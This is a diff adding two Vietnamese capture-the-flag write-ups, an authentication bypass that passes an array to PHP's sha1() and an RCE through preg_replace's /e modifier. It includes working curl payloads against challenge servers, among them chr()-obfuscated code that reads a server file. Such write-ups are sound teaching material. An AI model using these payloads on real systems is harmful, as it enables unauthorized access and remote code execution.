@@ -38,6 +38,8 @@
 - [Do you know Brute Force](https://github.com/DucThinh47/VibloCTF-Writeups#do-you-know-brute-force)
 - [Easy Password](https://github.com/DucThinh47/VibloCTF-Writeups#easy-password)
 - [WebShell](https://github.com/DucThinh47/VibloCTF-Writeups#webshell)
+- [Cracking SHA1]()
+- [Innocent Game?]()
 #### Web7
 
 ![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image0.png?raw=true)
@@ -1360,6 +1362,52 @@ Dựa vào đoạn code này, ý tưởng của tôi là sẽ lệnh vào tham s
 => Thành công in ra nội dung file `/etc/passwd`. Sau khi thử tìm flag ở các file hệ thống, tôi tìm được được flag trong shell `/start.sh` – thường là nơi seed `flag/env` trong container:
 
 ![img](https://github.com/DucThinh47/VibloCTF-Writeups/blob/main/images/image164.png?raw=true)
+
+#### Cracking SHA1
+
+![img](165)
+
+Phân tích đoạn code, có thể thấy
+- Hàm `checkPassword()` so sánh strict `===`, sai thì trả `""`; bên ngoài lại so sánh lỏng `==`
+
+=> Ý tưởng của tôi là làm `sha1($_POST["password"])` ra `NULL` bằng cách gửi `password[]= (mảng)` => `sha1(array) = NULL`
+
+Như vậy, `NULL == ""` => `true` => `set $_SESSION["user"]="psycho"` với `username=psycho`
+
+Payload cuối cùng như sau:
+
+    curl -c c.txt -X POST 'http://172.104.49.143:5013/' -d 'username=psycho&password[]='
+    curl -b c.txt 'http://172.104.49.143:5013/?flag=1'
+
+![img](166)
+
+![img](167)
+
+#### Innocent Game?
+
+![img](168)
+
+Tôi thử nhập giá trị `replace:abc` và `with:abc`, kiểm tra request và response:
+
+![img](169)
+
+Tôi thấy Server sử dụng là `Apache + PHP/5.3.29`. Đồng thời form sẽ nhận 2 tham số là `pattern` và `needle`. Như vậy, backend sẽ có logic như sau:
+
+    $replaced = preg_replace($pattern, $replacement, $subject);
+
+=> Lỗi PHP `preg_replace /e` => RCE. Dùng `pattern=/^/e` để ép eval phần `needle`. Tôi sẽ dùng payload không dấu nháy (build bằng `chr()`) đọc file `/var/www/html/index.php` và thấy flag comment ở đầu file.
+
+Payload cuối cùng sẽ là:
+
+    curl -s -X POST 'http://172.104.49.143:1409/index.php' \
+    --data-urlencode 'pattern=/^/e' \
+    --data-urlencode 'needle=@file_get_contents(
+        chr(47).chr(118).chr(97).chr(114).chr(47).chr(119).chr(119).chr(119).chr(47)
+        .chr(104).chr(116).chr(109).chr(108).chr(47)
+        .chr(105).chr(110).chr(100).chr(101).chr(120).chr(46)
+        .chr(112).chr(104).chr(112))'
+
+![img](171)
 
 
 
